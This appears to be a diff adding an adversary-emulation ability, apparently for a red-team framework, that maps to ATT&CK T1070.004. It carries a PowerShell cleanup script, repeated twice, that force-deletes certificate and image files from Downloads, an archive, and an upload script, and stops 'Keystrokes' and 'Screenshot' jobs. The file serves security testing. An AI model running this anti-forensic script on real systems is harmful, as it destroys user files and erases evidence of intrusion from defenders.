@@ -1,0 +1,68 @@
+- id: 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92
+  name: Artifact Cleanup
+  description: Delete file artifacts left from the operation.
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  cti_source: "https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments"
+  procedure_group: procedure_def_evasion
+  procedure_step: "10.A.3"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
+          Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
+          Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
+          if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
+              Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
+          } else {
+              write-host "[!] File did not exist to be removed!";
+          }
+
+          if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
+              Remove-Job -Name "Keystrokes";
+              if ($?) {
+                  write-host "[+] Job \"Keystrokes\" was remove.";
+              }
+          } else {
+              write-host "[!] Job \"Keystrokes\" did not exist.";
+          }
+
+          if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
+              Remove-Job -Name "Screenshot" -Force;
+              write-host "[+] Job \"screenshot\" was removed.";
+          } else {
+              write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
+          }
+          remove-item upload.ps1 -Force;
+
+  executors:
+  - name: powershell
+    command: |
+      Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
+      Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
+      Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
+      if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
+          Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
+      } else {
+          write-host "[!] File did not exist to be removed!";
+      }
+
+      if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
+          Remove-Job -Name "Keystrokes";
+          if ($?) {
+              write-host "[+] Job \"Keystrokes\" was remove.";
+          }
+      } else {
+          write-host "[!] Job \"Keystrokes\" did not exist.";
+      }
+
+      if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
+          Remove-Job -Name "Screenshot" -Force;
+          write-host "[+] Job \"screenshot\" was removed.";
+      } else {
+          write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
+      }
+      remove-item upload.ps1 -Force;
